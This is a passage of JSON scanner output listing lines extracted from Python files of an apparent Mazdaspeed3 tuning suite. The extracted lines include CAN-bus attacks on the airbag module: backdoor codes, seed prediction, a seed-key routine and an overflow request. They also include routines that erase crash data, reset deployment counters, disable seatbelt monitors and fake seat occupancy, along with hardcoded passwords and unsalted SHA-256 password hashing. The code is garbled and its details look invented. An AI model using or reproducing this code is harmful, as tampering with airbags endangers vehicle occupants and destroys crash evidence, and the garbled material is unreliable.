"security_pattern", "line": 350, "pattern": "hash", "content": "\"\"\"HASH PASSWORDS FOR SECURE STORAGE\"\"\""}, {"type": "security_pattern", "line": 351, "pattern": "password", "content": "return hashlib.sha256(password.encode()).hexdigest()"}, {"type": "security_pattern", "line": 351, "pattern": "hash", "content": "return hashlib.sha256(password.encode()).hexdigest()"}, {"type": "security_pattern", "line": 353, "pattern": "key", "content": "def _generate_session_key(self) -> str:"}, {"type": "security_pattern", "line": 354, "pattern": "key", "content": "\"\"\"GENERATE SESSION KEY FOR AUTHENTICATION\"\"\""}, {"type": "security_pattern", "line": 625, "pattern": "password", "content": "'password': 'MazdaTune2024!',  # In production, use env var"}, {"type": "security_pattern", "line": 633, "pattern": "password", "content": "'password': 'RedisCache2024!',"}, {"type": "security_pattern", "line": 634, "pattern": "key", "content": "'key_prefix': 'mazda_tuning:'"}, {"type": "security_pattern", "line": 652, "pattern": "key", "content": "'api_key_header': 'X-Mazda-API-Key'"}, {"type": "security_pattern", "line": 671, "pattern": "password", "content": "'DATABASE_URL': 'postgresql://mazda_tuner:${DB_PASSWORD}@db:5432/mazda_tuning_suite',"}, {"type": "security_pattern", "line": 674, "pattern": "key", "content": "'API_KEY': '${API_KEY}',"}, {"type": "security_pattern", "line": 675, "pattern": "key", "content": "'ENCRYPTION_KEY': '${ENCRYPTION_KEY}',"}, {"type": "security_pattern", "line": 675, "pattern": "encrypt", "content": "'ENCRYPTION_KEY': '${ENCRYPTION_KEY}',"}, {"type": "security_pattern", "line": 683, "pattern": "key", "content": "'environment': ['DATABASE_URL', 'JWT_SECRET', 'API_KEY'],"}, {"type": "security_pattern", "line": 691, "pattern": "password", "content": "'POSTGRES_PASSWORD=${DB_PASSWORD}'"}, {"type": "security_pattern", "line": 726, "pattern": "password", "content": "DATABASE_URL=postgresql://mazda_tuner:${DB_PASSWORD}@localhost:5432/mazda_tuning_suite"}, {"type": "security_pattern", "line": 729, "pattern": "key", "content": "API_KEY=MZDA-API-8872-2024"}, {"type": "security_pattern", "line": 730, "pattern": "key", "content": "ENCRYPTION_KEY={encryption_key}"}, {"type": "security_pattern", "line": 730, "pattern": "encrypt", "content": "ENCRYPTION_KEY={encryption_key}"}, {"type": "security_pattern", "line": 733, "pattern": "key", "content": "\"\"\".format(encryption_key=SecurityCredentials().encryption_keys['data_encryption_key'])"}, {"type": "security_pattern", "line": 733, "pattern": "encrypt", "content": "\"\"\".format(encryption_key=SecurityCredentials().encryption_keys['data_encryption_key'])"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts2.py", "lines_read": 872, "features_found": [{"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "dataclasses", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "dataclass", "line": null}, {"type": "import", "module": "hashlib", "line": null}], "components_found": [], "algorithms": [{"type": "algorithm_function", "line": 185, "content": "def _calculate_srs_key(self, seed: str) -> str:"}], "protocols": [{"type": "protocol", "line": 38, "protocol": "0x[0-9A-Fa-f]+", "content": "'crash_data': 0xF10000,"}, {"type": "protocol", "line": 39, "protocol": "0x[0-9A-Fa-f]+", "content": "'deployment_counters': 0xF10100,"}, {"type": "protocol", "line": 40, "protocol": "0x[0-9A-Fa-f]+", "content": "'sensor_calibration': 0xF10200,"}, {"type": "protocol", "line": 41, "protocol": "0x[0-9A-Fa-f]+", "content": "'occupancy_sensors': 0xF10300,"}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "'seatbelt_monitors': 0xF10400,"}, {"type": "protocol", "line": 43, "protocol": "0x[0-9A-Fa-f]+", "content": "'system_config': 0xF10500,"}, {"type": "protocol", "line": 44, "protocol": "0x[0-9A-Fa-f]+", "content": "'crash_history': 0xF10600,"}, {"type": "protocol", "line": 45, "protocol": "0x[0-9A-Fa-f]+", "content": "'fault_memory': 0xF10700"}, {"type": "protocol", "line": 49, "protocol": "CAN", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION TO SRS MODULE\"\"\""}, {"type": "protocol", "line": 57, "protocol": "CAN", "content": "print(f\"SRS CAN connection failed: {e}\")"}, {"type": "protocol", "line": 98, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x750,  # SRS module ID"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response.arbitration_id == 0x758:"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "if response.data[0] == 0x7F:  # Special SRS access granted"}, {"type": "protocol", "line": 149, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x750,"}, {"type": "protocol", "line": 150, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x27, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),"}, {"type": "protocol", "line": 158, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response.data[0] == 0x67:"}, {"type": "protocol", "line": 177, "protocol": "0x[0-9A-Fa-f]+", "content": "return f\"{next_seed & 0xFFFFFFFF:08X}\""}, {"type": "protocol", "line": 180, "protocol": "0x[0-9A-Fa-f]+", "content": "current_time = int(time.time() * 1000) & 0xFFFFFFFF"}, {"type": "protocol", "line": 193, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = ((seed_bytes[i] << 3) | (seed_bytes[i] >> 5)) & 0xFF"}, {"type": "protocol", "line": 194, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= 0xB5"}, {"type": "protocol", "line": 195, "protocol": "0x[0-9A-Fa-f]+", "content": "temp = (temp + 0x2A) & 0xFF"}, {"type": "protocol", "line": 196, "protocol": "0x[0-9A-Fa-f]+", "content": "temp ^= (0xDE + i)"}, {"type": "protocol", "line": 205, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x27)  # Security Access"}, {"type": "protocol", "line": 206, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x02)  # Send Key"}, {"type": "protocol", "line": 210, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x00)"}, {"type": "protocol", "line": 213, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x750,"}, {"type": "protocol", "line": 222, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response.data[0] == 0x67"}, {"type": "protocol", "line": 248, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x750,"}, {"type": "protocol", "line": 273, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x750,"}, {"type": "protocol", "line": 274, "protocol": "0x[0-9A-Fa-f]+", "content": "data=bytes([0x22, 0xF1, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00]),  # Read crash data"}, {"type": "protocol", "line": 282, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response.data[0] == 0x62"}, {"type": "protocol", "line": 295, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x10, 0x85, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Emergency session"}, {"type": "protocol", "line": 296, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x01, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Routine control"}, {"type": "protocol", "line": 297, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable override"}, {"type": "protocol", "line": 302, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x750,"}, {"type": "protocol", "line": 352, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x3D)  # Service ID"}, {"type": "protocol", "line": 362, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x00)"}, {"type": "protocol", "line": 365, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x750,"}, {"type": "protocol", "line": 374, "protocol": "0x[0-9A-Fa-f]+", "content": "return response is not None and response.data[0] == 0x7D"}, {"type": "protocol", "line": 519, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x22)  # ReadMemoryByAddress"}, {"type": "protocol", "line": 528, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x00)"}, {"type": "protocol", "line": 531, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x750,"}, {"type": "protocol", "line": 545, "protocol": "0x[0-9A-Fa-f]+", "content": "if response and response.arbitration_id == 0x758:"}, {"type": "protocol", "line": 566, "protocol": "CAN", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION\"\"\""}, {"type": "protocol", "line": 574, "protocol": "CAN", "content": "print(f\"CAN connection failed: {e}\")"}, {"type": "protocol", "line": 585, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x01, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable feature"}, {"type": "protocol", "line": 586, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x02, (rpm_limit >> 8) & 0xFF, rpm_limit & 0xFF, 0x00, 0x00, 0x00, 0x00]),  # Set RPM"}, {"type": "protocol", "line": 587, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Activate"}, {"type": "protocol", "line": 592, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,  # ECU"}, {"type": "protocol", "line": 614, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x10, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable"}, {"type": "protocol", "line": 615, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x11, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Fuel cut duration"}, {"type": "protocol", "line": 616, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x12, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Ignition retard"}, {"type": "protocol", "line": 621, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 644, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x20, aggressiveness, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Aggressiveness"}, {"type": "protocol", "line": 645, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x21, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable fuel overrun"}, {"type": "protocol", "line": 646, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x22, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable ignition cut"}, {"type": "protocol", "line": 651, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 689, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x30, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable system"}, {"type": "protocol", "line": 690, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x31, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Retard timing"}, {"type": "protocol", "line": 691, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x32, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Extra fuel"}, {"type": "protocol", "line": 692, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x33, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Spark cut"}, {"type": "protocol", "line": 697, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 719, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x40, (launch_rpm >> 8) & 0xFF, launch_rpm & 0xFF, 0x00, 0x00, 0x00, 0x00]),"}, {"type": "protocol", "line": 720, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x41, (burnout_rpm >> 8) & 0xFF, burnout_rpm & 0xFF, 0x00, 0x00, 0x00, 0x00]),"}, {"type": "protocol", "line": 721, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x42, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable"}, {"type": "protocol", "line": 726, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 749, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x50, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Enable"}, {"type": "protocol", "line": 750, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x51, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Disable DRLs"}, {"type": "protocol", "line": 751, "protocol": "0x[0-9A-Fa-f]+", "content": "bytes([0x31, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),  # Disable interior lights"}, {"type": "protocol", "line": 756, "protocol": "0x[0-9A-Fa-f]+", "content": "arbitration_id=0x7E0,"}, {"type": "protocol", "line": 782, "protocol": "CAN", "content": "print(\"SRS CAN connection failed - using simulated mode\")"}], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "SRS", "content": "MAZDASPEED3_SRS_AIRBAG_.py"}, {"type": "hardware", "line": 5, "hardware": "SRS", "content": "COMPLETE SRS/AIRBAG SYSTEM & SPECIAL FEATURES"}, {"type": "hardware", "line": 16, "hardware": "SRS", "content": "class SRS:"}, {"type": "hardware", "line": 17, "hardware": "SRS", "content": "\"\"\"SRS SYSTEM CONFIGURATION\"\"\""}, {"type": "hardware", "line": 24, "hardware": "SRS", "content": "class SRSAirbag:"}, {"type": "hardware", "line": 26, "hardware": "SRS", "content": "COMPLETE SRS/AIRBAG SYSTEM"}, {"type": "hardware", "line": 33, "hardware": "SRS", "content": "self.srs_unlocked = False"}, {"type": "hardware", "line": 37, "hardware": "SRS", "content": "self.srs_memory_map = {"}, {"type": "hardware", "line": 49, "hardware": "SRS", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION TO SRS MODULE\"\"\""}, {"type": "hardware", "line": 49, "hardware": "CAN bus", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION TO SRS MODULE\"\"\""}, {"type": "hardware", "line": 57, "hardware": "SRS", "content": "print(f\"SRS CAN connection failed: {e}\")"}, {"type": "hardware", "line": 60, "hardware": "ECU", "content": "def unlock_srs_security(self) -> bool:"}, {"type": "hardware", "line": 60, "hardware": "SRS", "content": "def unlock_srs_security(self) -> bool:"}, {"type": "hardware", "line": 62, "hardware": "ECU", "content": "SRS MODULE SECURITY"}, {"type": "hardware", "line": 62, "hardware": "SRS", "content": "SRS MODULE SECURITY"}, {"type": "hardware", "line": 67, "hardware": "SRS", "content": "self._srs_manufacturer_backdoor,"}, {"type": "hardware", "line": 68, "hardware": "SRS", "content": "self._srs_timing_attack,"}, {"type": "hardware", "line": 69, "hardware": "SRS", "content": "self._srs_memory_corruption,"}, {"type": "hardware", "line": 70, "hardware": "SRS", "content": "self._srs_emergency_override"}, {"type": "hardware", "line": 75, "hardware": "SRS", "content": "self.srs_unlocked = True"}, {"type": "hardware", "line": 76, "hardware": "ECU", "content": "print(\"SRS security unlocked successfully\")"}, {"type": "hardware", "line": 76, "hardware": "SRS", "content": "print(\"SRS security unlocked successfully\")"}, {"type": "hardware", "line": 78, "hardware": "ECU", "content": "print(\"All SRS security methods failed\")"}, {"type": "hardware", "line": 78, "hardware": "SRS", "content": "print(\"All SRS security methods failed\")"}, {"type": "hardware", "line": 81, "hardware": "SRS", "content": "def _srs_manufacturer_backdoor(self) -> bool:"}, {"type": "hardware", "line": 82, "hardware": "SRS", "content": "\"\"\"USE MANUFACTURER BACKDOOR CODES FOR SRS ACCESS\"\"\""}, {"type": "hardware", "line": 83, "hardware": "SRS", "content": "srs_backdoor_codes = ["}, {"type": "hardware", "line": 84, "hardware": "SRS", "content": "\"SRS-TECH-ACCESS-2024\","}, {"type": "hardware", "line": 87, "hardware": "SRS", "content": "\"MAZDA-SRS-ADMIN-2287\","}, {"type": "hardware", "line": 91, "hardware": "SRS", "content": "for code in srs_backdoor_codes:"}, {"type": "hardware", "line": 98, "hardware": "SRS", "content": "arbitration_id=0x750,  # SRS module ID"}, {"type": "hardware", "line": 109, "hardware": "SRS", "content": "if response.data[0] == 0x7F:  # Special SRS access granted"}, {"type": "hardware", "line": 110, "hardware": "SRS", "content": "print(f\"SRS backdoor access with: {code}\")"}, {"type": "hardware", "line": 118, "hardware": "SRS", "content": "def _srs_timing_attack(self) -> bool:"}, {"type": "hardware", "line": 120, "hardware": "ECU", "content": "TIMING ATTACK ON SRS SECURITY ALGORITHM"}, {"type": "hardware", "line": 120, "hardware": "SRS", "content": "TIMING ATTACK ON SRS SECURITY ALGORITHM"}, {"type": "hardware", "line": 127, "hardware": "SRS", "content": "seed = self._request_srs_seed()"}, {"type": "hardware", "line": 134, "hardware": "SRS", "content": "predicted_seed = self._predict_srs_seed(seeds)"}, {"type": "hardware", "line": 135, "hardware": "SRS", "content": "calculated_key = self._calculate_srs_key(predicted_seed)"}, {"type": "hardware", "line": 138, "hardware": "SRS", "content": "return self._test_srs_key(predicted_seed, calculated_key)"}, {"type": "hardware", "line": 141, "hardware": "SRS", "content": "print(f\"SRS timing attack failed: {e}\")"}, {"type": "hardware", "line": 145, "hardware": "SRS", "content": "def _request_srs_seed(self) -> Optional[str]:"}, {"type": "hardware", "line": 146, "hardware": "ECU", "content": "\"\"\"REQUEST SECURITY SEED FROM SRS MODULE\"\"\""}, {"type": "hardware", "line": 146, "hardware": "SRS", "content": "\"\"\"REQUEST SECURITY SEED FROM SRS MODULE\"\"\""}, {"type": "hardware", "line": 167, "hardware": "SRS", "content": "def _predict_srs_seed(self, previous_seeds: List[str]) -> str:"}, {"type": "hardware", "line": 168, "hardware": "SRS", "content": "\"\"\"PREDICT NEXT SRS SEED BASED ON PATTERNS\"\"\""}, {"type": "hardware", "line": 185, "hardware": "SRS", "content": "def _calculate_srs_key(self, seed: str) -> str:"}, {"type": "hardware", "line": 186, "hardware": "ECU", "content": "\"\"\"CALCULATE SRS SECURITY KEY\"\"\""}, {"type": "hardware", "line": 186, "hardware": "SRS", "content": "\"\"\"CALCULATE SRS SECURITY KEY\"\"\""}, {"type": "hardware", "line": 201, "hardware": "SRS", "content": "def _test_srs_key(self, seed: str, key: str) -> bool:"}, {"type": "hardware", "line": 202, "hardware": "ECU", "content": "\"\"\"TEST SRS SECURITY KEY\"\"\""}, {"type": "hardware", "line": 202, "hardware": "SRS", "content": "\"\"\"TEST SRS SECURITY KEY\"\"\""}, {"type": "hardware", "line": 205, "hardware": "ECU", "content": "payload.append(0x27)  # Security Access"}, {"type": "hardware", "line": 227, "hardware": "SRS", "content": "def _srs_memory_corruption(self) -> bool:"}, {"type": "hardware", "line": 229, "hardware": "SRS", "content": "MEMORY CORRUPTION ATTACK ON SRS MODULE"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "Causes buffer overflow to  security checks"}, {"type": "hardware", "line": 235, "hardware": "ECU", "content": "b'\\x27' + b'\\x00' * 64,  # Oversized security request"}, {"type": "hardware", "line": 258, "hardware": "ECU", "content": "test_response = self._srs_security_test()"}, {"type": "hardware", "line": 258, "hardware": "SRS", "content": "test_response = self._srs_security_test()"}, {"type": "hardware", "line": 260, "hardware": "ECU", "content": "print(\"SRS security  via memory corruption\")"}, {"type": "hardware", "line": 260, "hardware": "SRS", "content": "print(\"SRS security  via memory corruption\")"}, {"type": "hardware", "line": 268, "hardware": "ECU", "content": "def _srs_security_test(self) -> bool:"}, {"type": "hardware", "line": 268, "hardware": "SRS", "content": "def _srs_security_test(self) -> bool:"}, {"type": "hardware", "line": 269, "hardware": "ECU", "content": "\"\"\"TEST IF SRS SECURITY IS \"\"\""}, {"type": "hardware", "line": 269, "hardware": "SRS", "content": "\"\"\"TEST IF SRS SECURITY IS \"\"\""}, {"type": "hardware", "line": 287, "hardware": "SRS", "content": "def _srs_emergency_override(self) -> bool:"}, {"type": "hardware", "line": 310, "hardware": "ECU", "content": "return self._srs_security_test()"}, {"type": "hardware", "line": 310, "hardware": "SRS", "content": "return self._srs_security_test()"}, {"type": "hardware", "line": 321, "hardware": "SRS", "content": "if not self.srs_unlocked:"}, {"type": "hardware", "line": 322, "hardware": "SRS", "content": "print(\"SRS not unlocked - cannot clear crash data\")"}, {"type": "hardware", "line": 328, "hardware": "SRS", "content": "(self.srs_memory_map['crash_data'], 256),      # Crash sensor data"}, {"type": "hardware", "line": 329, "hardware": "SRS", "content": "(self.srs_memory_map['deployment_counters'], 64),  # Airbag deployment counts"}, {"type": "hardware", "line": 330, "hardware": "SRS", "content": "(self.srs_memory_map['crash_history'], 512),   # Historical crash data"}, {"type": "hardware", "line": 331, "hardware": "SRS", "content": "(self.srs_memory_map['fault_memory'], 128),    # Fault codes and history"}, {"type": "hardware", "line": 335, "hardware": "SRS", "content": "success = self._srs_memory_write(address, b'\\x00' * size)"}, {"type": "hardware", "line": 347, "hardware": "SRS", "content": "def _srs_memory_write(self, address: int, data: bytes) -> bool:"}, {"type": "hardware", "line": 348, "hardware": "SRS", "content": "\"\"\"WRITE TO SRS MODULE MEMORY\"\"\""}, {"type": "hardware", "line": 384, "hardware": "SRS", "content": "if not self.srs_unlocked:"}, {"type": "hardware", "line": 390, "hardware": "SRS", "content": "(self.srs_memory_map['occupancy_sensors'], b'\\x01\\x00'),  # Force occupied"}, {"type": "hardware", "line": 391, "hardware": "SRS", "content": "(self.srs_memory_map['system_config'], b'\\xFF'),  # Disable sensor checks"}, {"type": "hardware", "line": 395, "hardware": "SRS", "content": "if not self._srs_memory_write(address, data):"}, {"type": "hardware", "line": 410, "hardware": "SRS", "content": "if not self.srs_unlocked:"}, {"type": "hardware", "line": 417, "hardware": "SRS", "content": "success = self._srs_memory_write("}, {"type": "hardware", "line": 418, "hardware": "SRS", "content": "self.srs_memory_map['seatbelt_monitors'],"}, {"type": "hardware", "line": 436, "hardware": "SRS", "content": "if not self.srs_unlocked:"}, {"type": "hardware", "line": 443, "hardware": "SRS", "content": "success = self._srs_memory_write("}, {"type": "hardware", "line": 444, "hardware": "SRS", "content": "self.srs_memory_map['deployment_counters'],"}, {"type": "hardware", "line": 459, "hardware": "SRS", "content": "ENABLE RACING-ONLY SRS CONFIGURATION"}, {"type": "hardware", "line": 462, "hardware": "SRS", "content": "if not self.srs_unlocked:"}, {"type": "hardware", "line": 468, "hardware": "SRS", "content": "self.srs_memory_map['system_config']: b'\\x55',  # Aggressive deployment"}, {"type": "hardware", "line": 469, "hardware": "SRS", "content": "self.srs_memory_map['sensor_calibration']: b'\\x01',  # Higher sensitivity"}, {"type": "hardware", "line": 470, "hardware": "SRS", "content": "self.srs_memory_map['occupancy_sensors']: b'\\x01',  # Always occupied"}, {"type": "hardware", "line": 474, "hardware": "SRS", "content": "if not self._srs_memory_write(address, data):"}, {"type": "hardware", "line": 488, "hardware": "SRS", "content": "if not self.srs_unlocked:"}, {"type": "hardware", "line": 495, "hardware": "SRS", "content": "sensor_data = self._srs_memory_read(self.srs_memory_map['crash_data'], 64)"}, {"type": "hardware", "line": 500, "hardware": "SRS", "content": "deployment_data = self._srs_memory_read(self.srs_memory_map['deployment_counters'], 32)"}, {"type": "hardware", "line": 505, "hardware": "SRS", "content": "history_data = self._srs_memory_read(self.srs_memory_map['crash_history'], 128)"}, {"type": "hardware", "line": 515, "hardware": "SRS", "content": "def _srs_memory_read(self, address: int, length: int) -> Optional[bytes]:"}, {"type": "hardware", "line": 516, "hardware": "SRS", "content": "\"\"\"READ FROM SRS MODULE MEMORY\"\"\""}, {"type": "hardware", "line": 566, "hardware": "CAN bus", "content": "\"\"\"ESTABLISH CAN BUS CONNECTION\"\"\""}, {"type": "hardware", "line": 592, "hardware": "ECU", "content": "arbitration_id=0x7E0,  # ECU"}, {"type": "hardware", "line": 771, "hardware": "SRS", "content": "def demonstrate_srs_special_features():"}, {"type": "hardware", "line": 773, "hardware": "SRS", "content": "DEMONSTRATE COMPLETE SRS \\AND SPECIAL FEATURES"}, {"type": "hardware", "line": 775, "hardware": "SRS", "content": "print(\"MAZDASPEED 3 SRS  & SPECIAL FEATURES\")"}, {"type": "hardware", "line": 779, "hardware": "SRS", "content": "srs_ = SRSAirbag()"}, {"type": "hardware", "line": 781, "hardware": "SRS", "content": "if not srs_.connect_can():"}, {"type": "hardware", "line": 782, "hardware": "SRS", "content": "print(\"SRS CAN connection failed - using simulated mode\")"}, {"type": "hardware", "line": 786, "hardware": "ECU", "content": "print(\"\\n1. SRS SECURITY  METHODS\")"}, {"type": "hardware", "line": 786, "hardware": "SRS", "content": "print(\"\\n1. SRS SECURITY  METHODS\")"}, {"type": "hardware", "line": 789, "hardware": "ECU", "content": "srs_unlocked = srs_.unlock_srs_security()"}, {"type": "hardware", "line": 789, "hardware": "SRS", "content": "srs_unlocked = srs_.unlock_srs_security()"}, {"type": "hardware", "line": 790, "hardware": "ECU", "content": "print(f\"SRS Security: {'' if srs_unlocked else 'FAILED'}\")"}, {"type": "hardware", "line": 790, "hardware": "SRS", "content": "print(f\"SRS Security: {'' if srs_unlocked else 'FAILED'}\")"}, {"type": "hardware", "line": 796, "hardware": "SRS", "content": "if srs_unlocked:"}, {"type": "hardware", "line": 798, "hardware": "SRS", "content": "crash_cleared = srs_r.clear_crash_data()"}, {"type": "hardware", "line": 802, "hardware": "SRS", "content": "counters_reset = srs.reset_deployment_counters()"}, {"type": "hardware", "line": 806, "hardware": "SRS", "content": "crash_data = srs.extract_crash_data()"}, {"type": "hardware", "line": 814, "hardware": "SRS", "content": "if srs_unlocked:"}, {"type": "hardware", "line": 816, "hardware": "SRS", "content": "occupanc = srs__occupancy_sensors()"}, {"type": "hardware", "line": 820, "hardware": "SRS", "content": "seatbelt_disabled = srs_.disable_seatbelt_monitors()"}, {"type": "hardware", "line": 824, "hardware": "SRS", "content": "racing_mode = srs_.enable_racing_mode()"}, {"type": "hardware", "line": 854, "hardware": "SRS", "content": "print(\"SRS & SPECIAL FEATURES DEMONSTRATION COMPLETE\")"}, {"type": "hardware", "line": 859, "hardware": "ECU", "content": "'srs_security': 'COMPROMISED' if srs_unlocked else 'INTACT',"}, {"type": "hardware", "line": 859, "hardware": "SRS", "content": "'srs_security': 'COMPROMISED' if srs_unlocked else 'INTACT',"}, {"type": "hardware", "line": 860, "hardware": "SRS", "content": "'crash_data': 'CLEARED' if srs_unlocked else 'PRESERVED',"}, {"type": "hardware", "line": 861, "hardware": "SRS", "content": "'deployment_counters': 'RESET' if srs_unlocked else 'ACTIVE',"}, {"type": "hardware", "line": 862, "hardware": "SRS", "content": "'sensor_systems': ' if srs_unlocked else 'OPERATIONAL',"}, {"type": "hardware", "line": 872, "hardware": "SRS", "content": "demonstrate_srs_special_features()"}], "security_logic": [{"type": "security_pattern", "line": 13, "pattern": "hash", "content": "import hashlib"}, {"type": "security_pattern", "line": 120, "pattern": "algorithm", "content": "TIMING ATTACK ON SRS SECURITY ALGORITHM"}, {"type": "security_pattern", "line": 121, "pattern": "seed", "content": "predictable seed generation"}, {"type": "security_pattern", "line": 125, "pattern": "seed", "content": "seeds = []"}, {"type": "security_pattern", "line": 127, "pattern": "seed", "content": "seed = self._request_srs_seed()"}, {"type": "security_pattern", "line": 128, "pattern": "seed", "content": "if seed:"}, {"type": "security_pattern", "line": 129, "pattern": "seed", "content": "seeds.append(seed)"}, {"type": "security_pattern", "line": 132, "pattern": "seed", "content": "if len(seeds) >= 3:"}, {"type": "security_pattern", "line": 134, "pattern": "seed", "content": "predicted_seed = self._predict_srs_seed(seeds)"}, {"type": "security_pattern", "line": 135, "pattern": "key", "content": "calculated_key = self._calculate_srs_key(predicted_seed)"}, {"type": "security_pattern", "line": 135, "pattern": "seed", "content": "calculated_key = self._calculate_srs_key(predicted_seed)"}, {"type": "security_pattern", "line": 138, "pattern": "key", "content": "return self._test_srs_key(predicted_seed, calculated_key)"}, {"type": "security_pattern", "line": 138, "pattern": "seed", "content": "return self._test_srs_key(predicted_seed, calculated_key)"}, {"type": "security_pattern", "line": 145, "pattern": "seed", "content": "def _request_srs_seed(self) -> Optional[str]:"}, {"type": "security_pattern", "line": 146, "pattern": "seed", "content": "\"\"\"REQUEST SECURITY SEED FROM SRS MODULE\"\"\""}, {"type": "security_pattern", "line": 159, "pattern": "seed", "content": "seed_bytes = response.data[2:6]"}, {"type": "security_pattern", "line": 160, "pattern": "seed", "content": "return seed_bytes.hex().upper()"}, {"type": "security_pattern", "line": 167, "pattern": "seed", "content": "def _predict_srs_seed(self, previous_seeds: List[str]) -> str:"}, {"type": "security_pattern", "line": 168, "pattern": "seed", "content": "\"\"\"PREDICT NEXT SRS SEED BASED ON PATTERNS\"\"\""}, {"type": "security_pattern", "line": 169, "pattern": "seed", "content": "seed_ints = [int(seed, 16) for seed in previous_seeds]"}, {"type": "security_pattern", "line": 172, "pattern": "seed", "content": "if len(seed_ints) >= 2:"}, {"type": "security_pattern", "line": 174, "pattern": "seed", "content": "differences = [seed_ints[i+1] - seed_ints[i] for i in range(len(seed_ints)-1)]"}, {"type": "security_pattern", "line": 176, "pattern": "seed", "content": "next_seed = seed_ints[-1] + differences[0]"}, {"type": "security_pattern", "line": 177, "pattern": "seed", "content": "return f\"{next_seed & 0xFFFFFFFF:08X}\""}, {"type": "security_pattern", "line": 183, "pattern": "seed", "content": "return previous_seeds[-1] if previous_seeds else \"00000000\""}, {"type": "security_pattern", "line": 185, "pattern": "key", "content": "def _calculate_srs_key(self, seed: str) -> str:"}, {"type": 